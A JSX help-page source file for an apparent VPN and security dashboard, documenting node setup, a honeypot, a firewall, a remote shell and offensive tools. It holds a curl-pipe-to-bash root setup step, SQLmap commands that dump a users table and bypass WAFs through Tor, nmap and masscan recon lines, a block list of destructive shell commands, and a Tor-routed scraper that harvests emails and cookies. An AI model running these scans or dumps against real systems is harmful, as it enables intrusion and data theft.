          <div>• <strong>force-proxhq</strong> — force specific destinations to always use ProxhqVPN regardless of the commercial VPN's routing</div>
          <div>• <strong>block</strong> — block specific IPs or ranges entirely (neither VPN route used)</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Script Generator</h4>
        <p className="text-[10px] font-mono text-primary/83">Click <strong>Generate Script</strong> to download a shell script for your selected mode. The script sets up the correct ip rule, ip route, and iptables/nftables configuration for your system. Supports Linux (fwmark/namespace/routing-table) and macOS (routing-table only).</p>
        <CB label="fwmark mode — verify no conflict">{`wg show          # See ProxhqVPN fwmark value
ip rule show     # List all routing policy rules
ip route show table 100  # See ProxhqVPN routing table`}</CB>
        <Note type="info">If two VPNs use the same fwmark value, traffic routing becomes unpredictable. Always run the auto-detection step before enabling coexistence mode.</Note>
      </div>
    ),
  },
  {
    id: "nodes", title: "VPN Servers (Admin)", icon: Server,
    content: (
      <div className="space-y-3">
        <p>The <strong>VPN Servers</strong> page (<code>/nodes</code>) is the admin control panel for your ProxhqVPN server infrastructure.</p>
        <h4 className="font-bold text-primary text-[11px]">Provisioning a New Server</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Click <strong>Add Server</strong> → enter the server's IP, location, and label.</li>
          <li><span className="text-primary/30">2.</span> Click <strong>Get Setup Script</strong> — a bash script is generated for that server.</li>
          <li><span className="text-primary/30">3.</span> SSH into the server and run the script as root. It installs WireGuard, the ProxhqVPN daemon, and configures all firewall rules.</li>
          <li><span className="text-primary/30">4.</span> The server appears as <span className="text-green-400">Online</span> in the dashboard within 60 seconds.</li>
        </ol>
        <CB label="run on your new vps as root:">{`curl -s https://your-proxhqvpn-api/api/setup-script | bash`}</CB>
        <h4 className="font-bold text-primary text-[11px] mt-3">Server Actions</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Rotate IP</strong> — assigns a new public IP to the node (if provider supports it)</div>
          <div>• <strong>Enable/Disable</strong> — temporarily removes the node from the connection pool</div>
          <div>• <strong>Bulk Replace</strong> — swap all nodes with a new batch simultaneously</div>
          <div>• <strong>View Status</strong> — see live WireGuard peer count, uptime, CPU, and bandwidth</div>
        </div>
      </div>
    ),
  },
  {
    id: "silkweb", title: "SilkWeb Decoy Network (Admin)", icon: Network,
    content: (
      <div className="space-y-3">
        <p>SilkWeb (<code>/silkweb</code>) is the ProxhqVPN honeypot and decoy mesh. It deploys fake services that look real (SSH, HTTP, FTP, databases) to attract and fingerprint attackers.</p>
        <h4 className="font-bold text-primary text-[11px]">How SilkWeb Works</h4>
        <div className="space-y-2 text-[10px] font-mono text-primary/83">
          <div>1. SilkWeb traps listen on commonly-scanned ports (22, 80, 443, 3306, 5432, 6379, 27017).</div>
          <div>2. When an attacker connects, SilkWeb accepts the connection and logs every keystroke, payload, and command.</div>
          <div>3. The attacker's IP, fingerprint, and tools are captured and automatically added to the firewall blocklist.</div>
          <div>4. Advanced traps run nmap and SQLmap back against the attacker to identify their infrastructure.</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Running a Port Scan on a Trapped IP</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>SilkWeb</strong> → <strong>Trapped IPs</strong> tab.</li>
          <li><span className="text-primary/30">2.</span> Select a trapped IP → click <strong>Port Scan</strong>.</li>
          <li><span className="text-primary/30">3.</span> Toggle <strong>Use Tor</strong> to route the scan through Tor (recommended to avoid revealing your server IP).</li>
          <li><span className="text-primary/30">4.</span> Results show open ports, services, and OS fingerprint of the attacker's machine.</li>
        </ol>
        <Note type="danger">Counterscanning is a legal grey area in many jurisdictions. Only scan IPs that attacked you first, and consult legal counsel for your region.</Note>
      </div>
    ),
  },
  {
    id: "beacons", title: "Threat Monitor / Beacons (Admin)", icon: Bell,
    content: (
      <div className="space-y-3">
        <p>The <strong>Threat Monitor</strong> (<code>/beacons</code>) shows real-time intrusion detection alerts from all ProxhqVPN nodes and SilkWeb honeypots.</p>
        <h4 className="font-bold text-primary text-[11px]">Alert Types</h4>
        <div className="space-y-2">
          {[
            { t: "Port Scan Detected", d: "Sequential port probing detected on a VPN node. Attacker IP auto-blocked." },
            { t: "SSH Brute Force", d: "Multiple failed SSH login attempts from the same IP." },
            { t: "Honeypot Hit", d: "Connection to a SilkWeb decoy service. Full payload captured." },
            { t: "WireGuard Handshake Anomaly", d: "Invalid or replayed WireGuard handshake packets. Possible replay attack." },
            { t: "DNS Exfiltration Attempt", d: "Unusual DNS query volume or base64-encoded subdomains (DNS tunneling)." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-red-500/10 rounded px-3 py-2 bg-red-900/5">
              <div className="text-[10px] font-mono font-bold text-red-400">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Actions</h4>
        <p className="text-[10px] font-mono text-primary/83">For each alert: <strong>Dismiss</strong> (false positive), <strong>Block IP</strong> (add to firewall), or <strong>Investigate</strong> (run port scan, WHOIS, threat intel lookup).</p>
      </div>
    ),
  },
  {
    id: "firewall", title: "Firewall (Admin)", icon: Shield,
    content: (
      <div className="space-y-3">
        <p>The <strong>Firewall</strong> (<code>/firewall</code>) manages iptables/nftables rules across all 60 ProxhqVPN nodes simultaneously. Three tabs: <strong>Rules</strong>, <strong>Blocked IPs</strong>, and <strong>Export</strong>. Admin role required.</p>
        <h4 className="font-bold text-primary text-[11px]">Rule Types</h4>
        <div className="space-y-2">
          {[
            { t: "Block IP / CIDR", d: "Drop all packets from an IP or range (e.g. 185.220.101.0/24). Set expiry: permanent / 24h / 7 days / 30 days. Applied across all 60 nodes instantly." },
            { t: "Allow Port", d: "Allow inbound on a port/protocol. Required: 51820/UDP (WireGuard), 443/TCP. SSH lockdown: allow 22/TCP from YOUR_IP/32 only, then block 22 for all others." },
            { t: "Rate Limit", d: "Limit new connections per source IP. SSH brute force protection: 5/min burst 10 DROP. Prevents automated attacks without blocking legitimate users." },
            { t: "GeoIP Block", d: "Block traffic from specific countries using MaxMind GeoIP (updated weekly). ~99% accuracy — sophisticated attackers use VPNs to evade geo-blocks." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Priority Ordering</h4>
        <p className="text-[10px] font-mono text-primary/83">Rules are evaluated lowest-priority-number first. ALLOW rules for a port must have a lower number than DROP rules for the same port, or the allow is never reached.</p>
        <CB label="recommended priority order">{`Priority 1:   Allow loopback (lo interface)
Priority 5:   Allow admin SSH (YOUR_IP/32, port 22)
Priority 10:  Allow WireGuard (51820/UDP)
Priority 20:  Allow established connections
Priority 50:  Rate limit SSH (all IPs, 5/min)
Priority 90:  Block known attacker IPs
Priority 100: Default deny all (DROP)`}</CB>
        <h4 className="font-bold text-primary text-[11px] mt-3">Auto-Block Sources</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Ghost Trap</strong> — IPs hitting 3+ trap endpoints in 60 min auto-added to Blocked IPs</div>
          <div>• <strong>Ghost Trace</strong> — malicious destination IPs suggested when peer anomaly score &gt; 90</div>
          <div>• <strong>AbuseIPDB</strong> — if auto-block enabled in Threat Intel, IPs with confidence &gt;90 blocked automatically</div>
          <div>• <strong>ATR (Auto Threat Response)</strong> — IPS signatures from node Suricata trigger automatic block, trap, or throttle — no admin action required</div>
          <div>• <strong>Adaptive DDoS Shield</strong> — any source exceeding 5,000 new connections/10 s is auto-blocked at the perimeter; threshold is configurable</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Advanced Firewall Tabs (2026)</h4>
        <div className="space-y-2">
          {[
            { t: "ATR — Auto Threat Response", d: "Configure automatic responses to IPS events without admin approval. 4 response levels: Monitor (log only), Throttle (rate-limit to 128 Kbps), Trap (redirect to SilkWeb honeypot), Block (immediate DROP + ip6tables mirror). Responses are applied at the node perimeter — WireGuard peer traffic always flows freely through the FORWARD chain." },
            { t: "Composite IP Risk Score", d: "Each blocked IP receives a 0–100 risk score aggregated from: threat-feed confidence, beacon hit count, IPS signature match weight, geo-block status, fail2ban hit count, and Ghost Trace anomaly contribution. High-risk IPs are promoted to permanent blocks automatically." },
            { t: "Per-WireGuard-Peer Rules", d: "Assign allow / block / throttle rules to individual WireGuard peer keys. Rules are pushed to each node's FORWARD chain so they apply in-tunnel. Useful for revoking a specific device without removing the peer's WireGuard key. Peer IPs are resolved live from wg show allowed-ips." },
            { t: "Adaptive DDoS Shield", d: "A systemd watchdog on each node monitors per-source connection rates using ss -s and conntrack. Sources exceeding the configured threshold (default: 5,000 conn/10 s) are banned via iptables with a 30-minute expiry. The Security Events log captures all DDoS events with timestamp and source CIDR." },
            { t: "AI Firewall Rule Optimizer", d: "Analyzes your current ruleset and suggests: merging redundant CIDRs into supernets, reordering rules by hit frequency (hot rules moved to lower priority numbers for earlier evaluation), deduplicating overlapping GeoIP blocks, and identifying shadowed rules that are never evaluated." },
            { t: "Node Security Hardening Script", d: "Firewall → NodeSync tab → download a comprehensive bash script per node (Chicago 61, London 62, LA 63, Tokyo 64). Installs 9 systemd services: sysctl hardening, WireGuard-aware iptables (FORWARD -i wg0 -j ACCEPT), IPv6 mirror, fail2ban, SSH key-only auth, DDoS monitor, security event reporter, per-peer rules enforcer, firewall sync daemon." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <CB label="verify firewall state">{`sudo iptables -L INPUT -n --line-numbers   # All INPUT rules
sudo iptables -L OUTPUT -n | grep REJECT   # Kill switch rules
sudo ip6tables -L -n | grep DROP           # IPv6 rules active?
sudo iptables -L INPUT | grep limit        # Rate limit active?
sudo iptables -L FORWARD -n | grep wg0    # WireGuard FORWARD pass-through`}</CB>
        <h4 className="font-bold text-primary text-[11px] mt-3">Export iptables Script</h4>
        <p className="text-[10px] font-mono text-primary/83">Firewall → Export → "Generate iptables Script" downloads a .sh applying all active rules. Includes ip6tables mirroring for full IPv6 protection. Also available as nftables format (Settings → Export Format).</p>
        <Note type="warn">Never block 51820/UDP — it disconnects all WireGuard peers. Emergency recovery: sudo iptables -F &amp;&amp; sudo iptables -P INPUT ACCEPT. The ATR and DDoS systems never auto-block port 51820/UDP.</Note>
      </div>
    ),
  },
  {
    id: "terminal", title: "Remote Terminal (Admin)", icon: Terminal,
    content: (
      <div className="space-y-3">
        <p>The <strong>Terminal</strong> (<code>/terminal</code>) provides a web-based shell for executing commands on your ProxhqVPN server. It has 4 tabs: <strong>Shell</strong>, <strong>HTTP Client</strong>, <strong>Port Scanner</strong>, and <strong>Audit Log</strong>. Rate limited to 20 commands/min. Admin only.</p>
        <h4 className="font-bold text-primary text-[11px]">Tab 1 — Shell</h4>
        <p className="text-[10px] font-mono text-primary/83">Run Linux commands on the ProxhqVPN server. Commands are validated against an allowlist in standard mode. Toggle <strong>ProxhqVPN Mode</strong> (red banner) for full outbound access — nmap, nc, socat, python3, curl, wget, dig, whois and more. All commands logged.</p>
        <div className="space-y-2">
          {[
            { t: "ProxhqVPN Mode", d: "Unlocks full shell access beyond the allowlist. The red 'PROXHQVPN MODE ACTIVE' banner appears. HARD_BLOCKED patterns still enforced: rm -rf /, mkfs, dd if=/dev/zero, shutdown, halt." },
            { t: "Standard Mode", d: "Allowlist-only: ps, top, df, free, ss, netstat, ip, wg, ping, traceroute, curl (GET), cat, grep, journalctl, iptables -L, and more." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <CB label="wireguard status">{`wg show                          # All WireGuard interfaces and peers
wg show wg0 latest-handshakes    # When each peer last connected
wg show wg0 transfer             # Bytes transferred per peer
ip route show table main         # Full routing table`}</CB>
        <CB label="network diagnostics">{`ss -tnp | grep ESTABLISHED       # Active external connections
netstat -an | grep LISTEN        # Listening services
curl -s https://api64.ipify.org  # Verify exit IP
ping -c 4 8.8.8.8                # Connectivity check
journalctl -u wg-quick@wg0 -n 50 # WireGuard logs`}</CB>
        <CB label="proxhqvpn mode — recon">{`nmap -sV -p 1-10000 target.com   # Full port + version scan
nmap --script vuln target.com    # Vulnerability scripts
masscan -p 1-65535 target.com --rate 10000  # Fast scan
nc -zv target.com 443            # TCP connectivity
whois target.com                 # WHOIS data`}</CB>
        <h4 className="font-bold text-primary text-[11px] mt-3">Tab 2 — HTTP Client</h4>
        <p className="text-[10px] font-mono text-primary/83">Make arbitrary HTTP/HTTPS requests from the <em>server's</em> IP (not your browser). Set method, URL, headers, and body. Useful for testing APIs, verifying server-to-server reachability, or testing endpoints without browser CORS restrictions.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Tab 3 — Port Scanner</h4>
        <p className="text-[10px] font-mono text-primary/83">TCP scanner running from the server. Enter target IP/hostname and port range (e.g. <code>1-1024</code> or <code>22,80,443,8080</code>). Results show OPEN / CLOSED / FILTERED with service banner where available. Rate: 5 scans/min.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Tab 4 — Audit Log</h4>
        <p className="text-[10px] font-mono text-primary/83">Immutable timestamped record of every command: timestamp (UTC), user, mode (standard/proxhqvpn), command, exit code, duration. Filter by user, mode, or date. Exportable as CSV/JSON. Stored indefinitely in PostgreSQL.</p>
        <Note type="warn">All Terminal activity is audit-logged and visible to all admins. Never execute untrusted input. ProxhqVPN Mode is powerful — use it only for authorized operations on systems you own or have written permission to test.</Note>
      </div>
    ),
  },
  {
    id: "monitor", title: "Performance Monitor (Admin)", icon: Activity,
    content: (
      <div className="space-y-3">
        <p>The <strong>Performance</strong> page (<code>/monitor</code>) shows real-time system metrics across all VPN nodes.</p>
        <div className="space-y-2">
          {[
            { t: "CPU & RAM", d: "Per-node CPU usage and memory consumption updated every 30 seconds." },
            { t: "Bandwidth", d: "Inbound/outbound bytes per WireGuard interface. Used for capacity planning." },
            { t: "Active Connections", d: "Count of active WireGuard peers and their last handshake timestamps." },
            { t: "Network Sockets", d: "All open TCP/UDP sockets on each node — useful for detecting unexpected services." },
            { t: "MTU Optimization", d: "Automatically finds the optimal MTU for each node to prevent packet fragmentation." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
      </div>
    ),
  },
  {
    id: "sqlmap", title: "SQLmap Vulnerability Scanner", icon: ScanSearch,
    content: (
      <div className="space-y-4">
        <p>The <strong>SQLmap Scanner</strong> (<code>/sqlmap</code>) is a full integration of the SQLmap automatic SQL injection detection and exploitation tool, accessible from the ProxhqVPN dashboard. All scans can be routed through Tor.</p>
        <Note type="danger">Only scan targets you own or have explicit written permission to test. Unauthorized scanning is illegal.</Note>
        <h4 className="font-bold text-primary text-[11px]">Running a Scan from the UI</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>Vulnerability Scanner</strong> → enter the target URL.</li>
          <li><span className="text-primary/30">2.</span> Set the scan options (level, risk, technique, DBMS type).</li>
          <li><span className="text-primary/30">3.</span> Toggle <strong>Use Tor</strong> to route through Tor SOCKS5 (127.0.0.1:9050).</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Start Scan</strong> — results stream in as SQLmap finds injections.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-2">SQLmap Command Reference</h4>
        <CB label="basic get parameter test">{`sqlmap -u "https://target.com/page.php?id=1" --batch --dbs`}</CB>
        <CB label="test post form">{`sqlmap -u "https://target.com/login" \
  --data="username=admin&password=test" \
  --method POST \
  --batch --dbs`}</CB>
        <CB label="via tor (always recommended)">{`sqlmap -u "https://target.com/page.php?id=1" \
  --tor \
  --tor-type=SOCKS5 \
  --tor-port=9050 \
  --batch --dbs`}</CB>
        <CB label="dump specific database table">{`sqlmap -u "https://target.com/page.php?id=1" \
  --dbms=mysql \
  -D target_db \
  -T users \
  --dump \
  --batch`}</CB>
        <CB label="detect waf and bypass">{`sqlmap -u "https://target.com/page.php?id=1" \
  --identify-waf \
  --tamper=space2comment,charencode,randomcase \
  --level=5 --risk=3 \
  --batch --dbs`}</CB>
        <h4 className="font-bold text-primary text-[11px] mt-3">SQLmap Flags Reference</h4>
        <div className="space-y-1.5 text-[9px] font-mono">
          {[
            ["--level=1-5", "Test depth. 1=basic, 5=all possible injection points."],
            ["--risk=1-3", "Risk of damage. 1=safe, 3=includes heavy queries (may break DBs)."],
            ["--technique=BEUSTQ", "B=boolean, E=error, U=union, S=stacked, T=time, Q=inline."],
            ["--tamper=SCRIPT", "Apply evasion transforms (space2comment, charencode, etc)."],
            ["--dbms=TYPE", "Target specific DBMS: mysql, postgres, mssql, oracle, sqlite."],
            ["--dump-all", "Dump every database, table, and column (use carefully)."],
            ["--batch", "Non-interactive mode. Auto-answer all prompts with defaults."],
            ["--threads=N", "Parallel requests. Max 10 recommended."],
            ["--delay=N", "Seconds between requests. Use with sensitive targets."],
            ["--proxy=URL", "Route through a proxy (e.g. Burp: http://127.0.0.1:8080)."],
          ].map(([flag, desc]) => (
            <div key={flag} className="flex gap-3 border border-primary/10 rounded px-2 py-1">
              <code className="text-green-400/80 shrink-0 w-48">{flag}</code>
              <span className="text-primary/83">{desc}</span>
            </div>
          ))}
        </div>
      </div>
    ),
  },
  {
    id: "alphatools", title: "Alpha Toolkit", icon: Layers,
    content: (
      <div className="space-y-4">
        <p>The <strong>Alpha Toolkit</strong> (<code>/alpha-tools</code>) provides three advanced security research engines with a seamless Scanner → Verifier pipeline, all optionally routed through Tor. Available to Command Center Pro subscribers and all employees.</p>

        <h4 className="font-bold text-primary text-[11px]">Tool 1 — Universal Scanner</h4>
        <p className="text-[10px] font-mono text-primary/83">Alpha Scanner v4.0 supports 35+ programming languages, 200+ vulnerability patterns, multi-step exploit chain detection, network port scanning, service fingerprinting, and secret/credential detection.</p>
        <div className="space-y-2">
          {[
            { m: "Network Scan", d: "Port scanning + service fingerprinting + banner grabbing via nmap integration." },
            { m: "Security Audit", d: "Scan source code or config files for hardcoded secrets, weak keys, misconfigs, exposed credentials." },
            { m: "Exploit Scan", d: "200+ vulnerability patterns: SQLi, XSS, SSTI, SSRF, path traversal, deserialization, RCE chains." },
            { m: "Full Scan", d: "Runs all three modes sequentially. Generates a comprehensive HTML report." },
          ].map(({ m, d }) => (
            <div key={m} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{m}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <CB label="scanner workflow">{`1. Enter Target IP/Hostname (network/all mode) or Path/URL (security/exploit mode)
2. Set port range for network scans (default: 1-10000)
3. Add extra flags: --lang cpp  --deep  --config-audit
4. Toggle Tor Cloak to route scan through Tor
5. Click Run Scanner → monitor live output in terminal
6. When complete: click Download HTML Report or Send to Verifier`}</CB>

        <h4 className="font-bold text-primary text-[11px] mt-3">Tool 2 — Vulnerability Verifier</h4>
        <p className="text-[10px] font-mono text-primary/83">The Verifier takes the Alpha Scanner HTML report and <strong>actively probes every finding against the live target</strong>. It performs TLS handshakes, TCP banner grabs, HTTP header analysis, SQL error probes, SSRF checks, and CDN false-positive filtering.</p>
        <CB label="scanner → verifier pipeline">{`Step 1: Run Universal Scanner → wait for completion
Step 2: Click "Send to Verifier" (green button)
         → App switches to Verifier tab automatically
         → HTML report is pre-loaded (~N KB)
Step 3: Optionally set a Target URL override
Step 4: Toggle Tor Cloak for anonymous probing
Step 5: Click "Verify Findings"
Step 6: Results show:
         - Exposed findings with captured evidence
         - False positive count
         - CDN detection warning if applicable
         - Downloadable color-coded Exposure Report`}</CB>

        <h4 className="font-bold text-primary text-[11px] mt-3">Tool 3 — Web Scraper</h4>
        <p className="text-[10px] font-mono text-primary/83">Alpha Web Scraper runs entirely in the browser and stores everything in a local SQLite database. It captures pages, links, emails, phone numbers, OpenGraph metadata, JSON-LD structured data, forms, and file assets into 14 queryable tables.</p>
        <CB label="what the scraper captures">{`Table: pages         → URL, title, meta description, HTML, status code
Table: links         → All href links (internal + external) with anchor text
Table: emails        → All email addresses found on any scraped page
Table: phones        → Phone numbers extracted via regex
Table: images        → Image URLs and alt text
Table: forms         → Form actions, methods, and all input field names
Table: opengraph     → og:title, og:image, og:description, og:type
Table: jsonld        → JSON-LD structured data blocks
Table: headers       → HTTP response headers per page
Table: cookies       → Cookie names, values, flags (HttpOnly, Secure)
Table: scripts       → External script URLs loaded per page
Table: stylesheets   → External CSS URLs
Table: assets        → Other assets (fonts, media, PDFs, etc.)
Table: metadata      → Crawl session info, start time, depth`}</CB>
        <div className="text-[9px] font-mono text-primary/83 border border-primary/10 rounded px-3 py-2">
          Export all data as <strong>.sqlite</strong> (open in DB Browser for SQLite), <strong>CSV</strong> (per table), or <strong>JSON</strong>. Enable Tor Mode inside the scraper (top-right toggle) to route all fetch requests through Tor circuits.
        </div>

        <h4 className="font-bold text-primary text-[11px] mt-3">Global Tor Cloak</h4>
        <p className="text-[10px] font-mono text-primary/83">The <strong>Tor Cloak</strong> toggle at the top of the Alpha Toolkit page routes ALL tools (Scanner, Verifier, nmap, SQLmap) through the Tor daemon at 127.0.0.1:9050. The Tor badge shows your current exit IP — verify it's a Tor exit node before running any scans.</p>
      </div>
    ),
  },
  {
    id: "securityaudit", title: "Security Audit (Admin)", icon: Lock,
    content: (
      <div className="space-y-3">
        <p>The <strong>Security Audit</strong> page (<code>/security-audit</code>) runs a full self-audit of the ProxhqVPN platform, checking for misconfigurations, weak settings, exposed endpoints, and known vulnerabilities in the installed software stack.</p>
        <h4 className="font-bold text-primary text-[11px]">What It Checks</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          {[
            "WireGuard key strength and rotation status",
            "Firewall rules completeness (default-deny, rate limiting)",
            "TLS certificate validity and cipher suites",
            "Open ports audit — unexpected services flagged",
            "Daemon PSK strength (entropy check)",
            "Admin password and session security",
            "Database exposure — ensures no DB ports are externally accessible",
            "Clerk auth configuration validity",
            "CORS configuration against known bypass techniques",
            "Content Security Policy headers audit",
          ].map(c => <div key={c}>• {c}</div>)}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Run</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Click <strong>Run Self-Audit</strong>. Results appear in under 30 seconds.</li>
          <li><span className="text-primary/30">2.</span> Each finding is rated: <span className="text-green-400">PASS</span>, <span className="text-yellow-400">WARN</span>, or <span className="text-red-400">FAIL</span>.</li>
          <li><span className="text-primary/30">3.</span> Expand any finding for remediation instructions.</li>
          <li><span className="text-primary/30">4.</span> Re-run after making changes to verify fixes.</li>
        </ol>
      </div>
    ),
  },
  {
    id: "threatintel", title: "Threat Intelligence", icon: TrendingUp,
    content: (
      <div className="space-y-3">
        <p>The <strong>Threat Intel</strong> page (<code>/threat-intel</code>) provides IP reputation lookups, WHOIS queries, TLS certificate inspection, and real-time threat feed integration.</p>
        <div className="space-y-2">
          {[
            { t: "IP Reputation Check", d: "Query IP against AbuseIPDB, Shodan, GreyNoise, and VirusTotal. See abuse reports, open ports, and geolocation." },
            { t: "WHOIS Lookup", d: "Full WHOIS data for any IP or domain. Identifies registrar, registrant, nameservers, and abuse contacts." },
            { t: "TLS Certificate Inspector", d: "Check any domain's TLS certificate: issuer, expiry, cipher suite, HSTS policy, certificate transparency logs." },
            { t: "HTTP Headers Inspector", d: "Fetch and analyze HTTP response headers for a target. Checks for missing security headers (CSP, HSTS, X-Frame-Options)." },
            { t: "Threat Feeds", d: "Live feed of IPs flagged by Emerging Threats, Spamhaus, and ProxhqVPN's own SilkWeb trap network." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
      </div>
    ),
  },
  {
    id: "ipexposure", title: "IP Exposure Scanner", icon: Eye,
    content: (
      <div className="space-y-3">
        <p>The <strong>IP Exposure Scanner</strong> (<code>/ip-exposure</code>) shows you a full breakdown of what your current IP address reveals to websites, trackers, and monitoring systems. Available to all VPN Basic subscribers.</p>
        <h4 className="font-bold text-primary text-[11px]">What It Shows</h4>
        <div className="space-y-2">
          {[
            { t: "Public IP & Geolocation", d: "Your external IP with country, region, city, ISP name, and ASN — exactly what websites see when you connect." },
            { t: "VPN / Proxy Detection", d: "Whether your IP is flagged as a known VPN exit, proxy, or Tor exit node by third-party databases." },
            { t: "WebRTC Leak Test", d: "Checks if your browser leaks your real local IP via WebRTC, even when using a VPN." },
            { t: "DNS Leak Test", d: "Verifies that your DNS queries are routed through ProxhqVPN's encrypted DNS, not your ISP's servers." },
            { t: "Browser Fingerprint Risk", d: "Checks canvas fingerprint, user-agent, timezone, and language consistency against your apparent location." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Using IP Exposure Scanner</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>IP Exposure</strong> — the scan runs automatically on page load.</li>
          <li><span className="text-primary/30">2.</span> If you see a <span className="text-red-400">LEAK DETECTED</span> badge, follow the remediation steps shown on screen.</li>
          <li><span className="text-primary/30">3.</span> Enable <strong>Kill Switch</strong> and ensure your WireGuard connection is active to resolve most leak types.</li>
          <li><span className="text-primary/30">4.</span> Use the <strong>DNS Shield</strong> page to fix DNS leak issues specifically.</li>
        </ol>
        <Note type="info">Run the IP Exposure Scanner before and after connecting to ProxhqVPN to verify your IP is properly masked.</Note>
      </div>
    ),
  },
  {
    id: "httprobe", title: "HTTP Probe", icon: Send,
    content: (
      <div className="space-y-3">
        <p>The <strong>HTTP Probe</strong> (<code>/http-probe</code>) is a full-featured HTTP client for crafting and sending custom HTTP requests. It is equivalent to Burp Suite Repeater and is available to Command Center Pro subscribers.</p>
        <h4 className="font-bold text-primary text-[11px]">Key Features</h4>
        <div className="space-y-2">
          {[
            { t: "Custom Headers", d: "Set any request header including Authorization, Content-Type, Cookie, X-Forwarded-For, and custom headers." },
            { t: "All HTTP Methods", d: "GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS, CONNECT, TRACE." },
            { t: "Body Editors", d: "Switch between raw text, JSON, form data, XML, and binary body types with syntax highlighting." },
            { t: "Response Inspector", d: "View response status, headers, body, timing, and size. Syntax-highlighted JSON and HTML responses." },
            { t: "Tor Routing", d: "Toggle to route requests through Tor SOCKS5 to hide your probe origin." },
            { t: "Request History", d: "All requests logged locally. Re-send, modify, or compare any previous request." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <Note type="danger">Only probe targets you own or have explicit written authorization to test. Unauthorized HTTP probing may violate the CFAA and similar laws.</Note>
      </div>
    ),
  },
  {
    id: "dirfuzzer", title: "Directory Fuzzer", icon: FolderSearch,
    content: (
      <div className="space-y-3">
        <p>The <strong>Directory Fuzzer</strong> (<code>/dir-fuzzer</code>) brute-forces hidden files and directories on web servers using customizable wordlists. Equivalent to ffuf or gobuster. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">How to Run a Directory Fuzz</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Enter the target URL (e.g. <code>https://target.com/</code>).</li>
          <li><span className="text-primary/30">2.</span> Choose a wordlist: <strong>Common</strong> (admin panels, backups), <strong>API Routes</strong>, <strong>Git/Config Files</strong>, or upload a custom list.</li>
          <li><span className="text-primary/30">3.</span> Set the file extensions to append (e.g. <code>.php, .bak, .old, .zip</code>).</li>
          <li><span className="text-primary/30">4.</span> Set the thread count and delay. Higher threads = faster but more detectable.</li>
          <li><span className="text-primary/30">5.</span> Toggle <strong>Tor Mode</strong> to route requests anonymously.</li>
          <li><span className="text-primary/30">6.</span> Click <strong>Start Fuzz</strong> — discovered paths stream in real-time.</li>
        </ol>
        <Note type="warn">Fuzzing sends hundreds or thousands of requests per minute. This may trigger WAFs, rate limiting, or alert the target's monitoring systems.</Note>
      </div>
    ),
  },
  {
    id: "subdomains", title: "Subdomain Scout", icon: Radar,
    content: (
      <div className="space-y-3">
        <p>The <strong>Subdomain Scout</strong> (<code>/subdomain-scan</code>) enumerates subdomains of a target domain using multiple passive and active techniques. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Enumeration Methods</h4>
        <div className="space-y-2">
          {[
            { t: "Certificate Transparency (CT Logs)", d: "Query crt.sh and other CT log aggregators for every SSL certificate ever issued for the domain. Purely passive — never touches the target." },
